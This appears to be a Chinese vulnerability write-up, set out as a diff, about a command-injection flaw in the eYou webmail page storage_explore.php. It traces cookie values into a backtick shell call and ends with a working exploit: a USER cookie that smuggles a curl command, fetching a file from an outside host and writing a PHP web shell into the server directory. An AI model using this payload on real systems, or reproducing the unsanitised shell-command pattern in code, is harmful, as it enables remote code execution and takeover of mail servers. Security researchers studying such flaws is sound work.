@@ -1,0 +1,83 @@
+文件/user/storage_explort.php
+<?php
+/**
+* 用户网络存储列表
+*
+* 该页面显示登录邮箱用户的网络存储文件列表，选择后添加到邮件的附件中。
+*
+* @author FengHui <fenghui@eyou.net>
+* @copyright 2008 eYou.net
+* @version storage_explore.php 2008/05/19
+*/
+require_once('/var/eyou/apache/htdocs/config.php');
+require_once(PATH.'inc/function.php');
+require_once(PATH.'inc/libeyou.php');
+require_once(PATH.'inc/operate.php');
+
+$skin               = getCookieUserValue('SKIN');
+$uid                = getCookieUserValue('UID');
+$domain             = getCookieUserValue('DOMAIN');
+$user_dir_path      = getUserDirPath($uid, $domain);
+$storage_index_path = $user_dir_path.'/storage/Index/';
+$storage_data_path  = $user_dir_path.'/storage/Data/';
+$userinfo = get_userinfo($uid , $domain);
+
+// 获取用户允许上传的最大附件大小
+$attachsize = (int)($userinfo['attachsize'][0]);
+
+$is_submit = $_POST['is_submit'] ? true : false;
+?>
+跟进getCookieUserValue函数：
+
+function getCookieUserValue($key) {
+    $user_arr = explode('&', cookie('USER'));
+    $n = count($user_arr);
+    for ($i = 0; $i < $n; $i++) {
+        $g_arr = explode('=', $user_arr[$i]);
+        if ($g_arr[0] == $key) {
+            return $g_arr[1];
+        }
+    }
+    return null;
+}
+
+跟进cookie函数：
+function cookie($name){
+    if (array_key_exists($name, $_COOKIE)) return $_COOKIE[$name];
+       return '';
+
+整个过程没有对cookie 进行过滤
+
+直接就取那个cookie中USER的值取出来，然后进入了getUserDirPath函数
+
+来看看getUserDirPath函数：
+
+/**
+* 获取用户目录的路径
+*
+* @param string $uid
+* @param string $domain
+*/
+function getUserDirPath($uid, $domain) {
+    $cmd = "/var/eyou/sbin/hashid $uid $domain";
+    echo $cmd;
+    $path = `$cmd`;
+    $path = trim($path);
+    return $path;
+}
+
+uid和domain直接进入了命令，导致命令执行。
+
+
+
+漏洞利用：
+
+将cookie设置为：
+
+USER=UID=1|curl http://www.isafe.cc:8080/test.txt>>www.isafe.cc.php
+然后访问localhost/user/storage_explore.php
+此时会在localhost/user/下生成www.isafe.cc.php文件
+
+shell地址为：
+
+localhost/user/www.isafe.cc.php
